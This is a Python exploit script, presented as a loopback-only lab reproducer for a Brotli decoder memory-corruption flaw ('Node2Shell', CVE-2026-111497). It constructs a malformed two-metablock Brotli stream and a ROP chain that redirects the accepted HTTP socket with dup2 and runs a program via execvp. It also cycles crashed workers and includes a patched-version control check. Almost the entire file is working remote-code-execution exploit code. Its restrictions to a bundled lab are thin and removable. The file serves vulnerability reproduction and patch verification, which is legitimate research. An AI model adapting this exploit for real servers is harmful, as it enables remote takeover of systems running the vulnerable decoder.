#!/usr/bin/env python3
"""Constrained local-lab reproducer for CVE-2026-111497.

The program intentionally has no arbitrary target or command option.  It only
talks to the bundled lab on loopback and executes the lab's fixed /n2s proof
helper.  A result is accepted only when a process-bound nonce and fresh `id`
output return on the exploited HTTP request socket.
"""

from __future__ import annotations

import argparse
from dataclasses import dataclass
import hashlib
import json
from pathlib import Path
import re
import socket
import struct
import sys
import time


LOOPBACK_HOST = "127.0.0.1"
LAB_PORT = 3000
PROFILE_PATH = Path(__file__).with_name("profile-v24.22.0.json")
TRIGGER_SHA256 = "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4"
TOKEN_PATTERN = re.compile(rb"PONG ([0-9a-f]{32})\n")
ID_PATTERN = re.compile(
    rb"uid=\d+(?:\([^\r\n)]+\))?\s+gid=\d+(?:\([^\r\n)]+\))?"
    rb"(?:\s+groups=[^\r\n]+)?"
)


class LsbFields:
    """Pack integer fields in Brotli's least-significant-bit-first order."""

    def __init__(self) -> None:
        self._bytes = bytearray()
        self._pending = 0
        self._width = 0

    def append(self, value: int, width: int) -> None:
        if width < 0 or value < 0 or value >= (1 << width):
            raise ValueError(f"field does not fit: value={value}, width={width}")
        self._pending |= value << self._width
        self._width += width
        while self._width >= 8:
            self._bytes.append(self._pending & 0xFF)
            self._pending >>= 8
            self._width -= 8

    def pad_to_byte(self) -> None:
        if self._width:
            self.append(0, 8 - self._width)

    def append_bytes(self, value: bytes) -> None:
        if self._width:
            raise ValueError("raw bytes require byte alignment")
        self._bytes.extend(value)

    def take(self) -> bytes:
        self.pad_to_byte()
        return bytes(self._bytes)


def _simple_tree(out: LsbFields, alphabet_size: int, symbol: int) -> None:
    out.append(1, 2)
    out.append(0, 2)
    out.append(symbol, (alphabet_size - 1).bit_length())


def _var_u8(out: LsbFields, value: int) -> None:
    if value == 0:
        out.append(0, 1)
        return
    out.append(1, 1)
    if value == 1:
        out.append(0, 3)
        return
    width = value.bit_length() - 1
    out.append(width, 3)
    out.append(value - (1 << width), width)


def malformed_brotli(prefix: bytes, block_extra: int = 0xFFFFFF) -> bytes:
    """Construct the two-metablock stream used by the affected decoder path."""

    if len(prefix) > 0x10000:
        raise ValueError("controlled prefix is too large")
    if not 0 <= block_extra <= 0xFFFFFF:
        raise ValueError("block length field is outside 24-bit range")

    out = LsbFields()
    out.append(1, 1)
    out.append(0, 3)
    out.append(2, 3)

    if prefix:
        out.append(0, 1)
        out.append(0, 2)
        out.append(len(prefix) - 1, 16)
        out.append(1, 1)
        out.pad_to_byte()
        out.append_bytes(prefix)

    out.append(0, 1)
    out.append(2, 2)
    out.append(0xFFFFFF, 24)
    out.append(0, 1)
    _var_u8(out, 0)
    _var_u8(out, 1)
    _simple_tree(out, 4, 0)
    _simple_tree(out, 26, 25)
    out.append(block_extra, 24)
    _var_u8(out, 0)
    out.append(3, 6)
    out.append(0, 2)
    _var_u8(out, 0)
    _var_u8(out, 0)
    _simple_tree(out, 256, 0)
    _simple_tree(out, 704, 130)
    _simple_tree(out, 704, 130)
    _simple_tree(out, 400, 184)

    distance_code = (len(prefix) + 32) // 8 if prefix else 4
    commands = 1 << 24
    while out._width and commands:
        out.append(distance_code, 11)
        commands -= 1

    repeated = LsbFields()
    for _ in range(8):
        repeated.append(distance_code, 11)
    group = repeated.take()
    groups, tail = divmod(commands, 8)
    out.append_bytes(group * groups)
    for _ in range(tail):
        out.append(distance_code, 11)
    return out.take()


def _number(mapping: dict[str, object], name: str) -> int:
    value = mapping[name]
    return int(value, 0) if isinstance(value, str) else int(value)


@dataclass(frozen=True)
class Profile:
    raw: dict[str, object]

    @classmethod
    def load(cls) -> "Profile":
        raw = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
        if raw.get("target") != "127.0.0.1:3000":
            raise RuntimeError("profile target must remain the bundled loopback lab")
        return cls(raw)

    def n(self, name: str) -> int:
        return _number(self.raw, name)


def build_stage_one(profile: Profile) -> bytes:
    controlled = bytearray(profile.n("prefix_size"))
    source = profile.n("copy_source_offset")
    struct.pack_into(
        "<QQ",
        controlled,
        source,
        profile.n("mov_rax_rdi_ret"),
        profile.n("pivot_rsp_rax_30_ret"),
    )

    bss = profile.n("bss_base")
    rop = (
        profile.n("pop_rsi_ret"),
        bss + 8,
        profile.n("store_rdi_plus_88_ret"),
        profile.n("pop_rbx_ret"),
        bss,
        profile.n("pop_rdi_ret"),
        profile.n("accepted_socket_fd"),
        profile.n("pop_rsi_ret"),
        1,
        profile.n("dup2_plt"),
        profile.n("execvp_call_site"),
    )
    struct.pack_into("<" + "Q" * len(rop), controlled, source + 0x30, *rop)

    proof_program = b"/n2s\0"
    proof_offset = source + 0x88
    controlled[proof_offset : proof_offset + len(proof_program)] = proof_program
    return malformed_brotli(
        bytes(controlled), profile.n("command_block_extra")
    ) + b"\0" * 3


def build_stage_two(position: int, length: int) -> bytes:
    if length < 27:
        raise ValueError("stage two is too short")
    body = bytearray(length)
    body[7] = 8
    struct.pack_into("<iII", body, 15, position, 0x7FFFFFFF, 0x7FFFFFFF)
    return bytes(body)


def _chunk(value: bytes) -> bytes:
    return f"{len(value):x}\r\n".encode("ascii") + value + b"\r\n"


def _connect(timeout: float) -> socket.socket:
    connection = socket.create_connection((LOOPBACK_HOST, LAB_PORT), timeout)
    connection.settimeout(timeout)
    return connection


def _receive(connection: socket.socket, limit: int = 32768) -> bytes:
    result = bytearray()
    while len(result) < limit:
        try:
            piece = connection.recv(min(4096, limit - len(result)))
        except (ConnectionResetError, TimeoutError, socket.timeout):
            break
        if not piece:
            break
        result.extend(piece)
    return bytes(result)


def health_token(timeout: float) -> bytes | None:
    try:
        with _connect(timeout) as connection:
            connection.sendall(
                b"GET /health HTTP/1.1\r\nHost: lab\r\nConnection: close\r\n\r\n"
            )
            match = TOKEN_PATTERN.search(_receive(connection, 4096))
            return match.group(1) if match else None
    except OSError:
        return None


def wait_for_token(timeout: float, different_from: bytes | None = None) -> bytes | None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        token = health_token(min(0.75, timeout))
        if token is not None and token != different_from:
            return token
        time.sleep(0.1)
    return None


def send_stages(first: bytes, second: bytes, delay: float, timeout: float) -> bytes:
    headers = (
        b"POST /upload HTTP/1.1\r\n"
        b"Host: lab\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Encoding: br\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
    )
    try:
        with _connect(timeout) as connection:
            connection.sendall(headers + _chunk(first))
            time.sleep(delay)
            connection.sendall(_chunk(second) + b"0\r\n\r\n")
            return _receive(connection)
    except OSError:
        return b""


def force_fresh_worker(profile: Profile, old_token: bytes, timeout: float) -> bytes:
    changed = wait_for_token(1.0, old_token)
    if changed is not None:
        return changed

    trigger = malformed_brotli(b"")
    if hashlib.sha256(trigger).hexdigest() != TRIGGER_SHA256:
        raise RuntimeError("internal trigger fingerprint mismatch")
    crash_second = build_stage_two(0x7FFFFFFF, 127)
    send_stages(trigger + b"\0" * 3, crash_second, 0.5, timeout)
    changed = wait_for_token(profile.n("restart_timeout_seconds"), old_token)
    if changed is None:
        raise RuntimeError("lab supervisor did not provide a fresh worker")
    return changed


def verify(response: bytes, token: bytes) -> tuple[str, str] | None:
    marker = b"N2S-PROOF:" + token
    if marker not in response:
        return None
    identity = ID_PATTERN.search(response)
    if identity is None:
        return None
    return marker.decode("ascii"), identity.group(0).decode("ascii", errors="replace")


def classify_response(response: bytes, proof: tuple[str, str] | None) -> str:
    if proof is not None:
        return "rce-proof"
    if not response:
        return "connection-closed-or-crash"
    if b"ERROR_FORMAT_BLOCK_SWITCH" in response:
        return "patched-decoder-rejection"
    if response.startswith(b"HTTP/1.1 400"):
        return "http-400-without-proof"
    if response.startswith(b"HTTP/"):
        return "http-response-without-proof"
    return "non-http-response-without-proof"


def run(profile: Profile, attempts: int, timeout: float) -> dict[str, object]:
    stage_one = build_stage_one(profile)
    positions = [int(value, 0) for value in profile.raw["staged_positions"]]
    stages = {
        position: build_stage_two(position, profile.n("second_stage_size"))
        for position in positions
    }

    token = wait_for_token(profile.n("restart_timeout_seconds"))
    if token is None:
        raise RuntimeError("bundled loopback lab is not healthy")

    observations: list[dict[str, object]] = []
    for attempt in range(1, attempts + 1):
        position = positions[(attempt - 1) % len(positions)]
        print(
            f"attempt={attempt}/{attempts} token={token.decode()} position={position:#x}",
            flush=True,
        )
        response = send_stages(
            stage_one,
            stages[position],
            float(profile.raw["stage_delay_seconds"]),
            timeout,
        )
        proof = verify(response, token)
        observations.append(
            {
                "attempt": attempt,
                "position": f"0x{position:x}",
                "response_bytes": len(response),
                "proof": proof is not None,
                "outcome": classify_response(response, proof),
            }
        )
        if proof is not None:
            marker, identity = proof
            return {
                "result": "rce-verified",
                "profile": profile.raw["id"],
                "proof_marker": marker,
                "proof_command": "/n2s (fixed nonce + /usr/bin/id)",
                "proof_stdout": identity,
                "proof_channel": "exploited HTTP request socket",
                "successful_attempt": attempt,
                "observations": observations,
            }
        if attempt < attempts:
            token = force_fresh_worker(profile, token, timeout)

    return {
        "result": "not-verified",
        "profile": profile.raw["id"],
        "observations": observations,
    }


def run_patched_control(profile: Profile, timeout: float) -> dict[str, object]:
    token = wait_for_token(profile.n("restart_timeout_seconds"))
    if token is None:
        raise RuntimeError("bundled loopback lab is not healthy")
    position = int(profile.raw["staged_positions"][0], 0)
    response = send_stages(
        build_stage_one(profile),
        build_stage_two(position, profile.n("second_stage_size")),
        float(profile.raw["stage_delay_seconds"]),
        timeout,
    )
    after = health_token(min(timeout, 2.0))
    proof = verify(response, token)
    rejected = b"ERROR_FORMAT_BLOCK_SWITCH" in response
    survived = after == token
    result = "patched-control-pass" if proof is None and rejected and survived else "control-failed"
    return {
        "result": result,
        "profile": profile.raw["id"],
        "proof_observed": proof is not None,
        "decoder_rejected_block_switch": rejected,
        "same_process_survived": survived,
        "response_sample": response[:512].decode("latin-1", errors="replace"),
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Loopback-only Node2Shell lab reproducer with process-bound proof"
    )
    parser.add_argument("--attempts", type=int, default=32)
    parser.add_argument("--timeout", type=float, default=30.0)
    parser.add_argument("--json-output", type=Path)
    parser.add_argument(
        "--expect",
        choices=("vulnerable", "patched"),
        default="vulnerable",
        help="run the RCE verifier or the same-payload patched negative control",
    )
    args = parser.parse_args()
    if not 1 <= args.attempts <= 64:
        parser.error("--attempts must be between 1 and 64")
    if not 1.0 <= args.timeout <= 60.0:
        parser.error("--timeout must be between 1 and 60 seconds")

    profile = Profile.load()
    result = (
        run(profile, args.attempts, args.timeout)
        if args.expect == "vulnerable"
        else run_patched_control(profile, args.timeout)
    )
    rendered = json.dumps(result, ensure_ascii=False, indent=2)
    print(rendered)
    if args.json_output:
        args.json_output.write_text(rendered + "\n", encoding="utf-8")
    return 0 if result["result"] in {"rce-verified", "patched-control-pass"} else 2


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, RuntimeError, ValueError) as error:
        print(f"ERROR: {error}", file=sys.stderr)
        raise SystemExit(1)
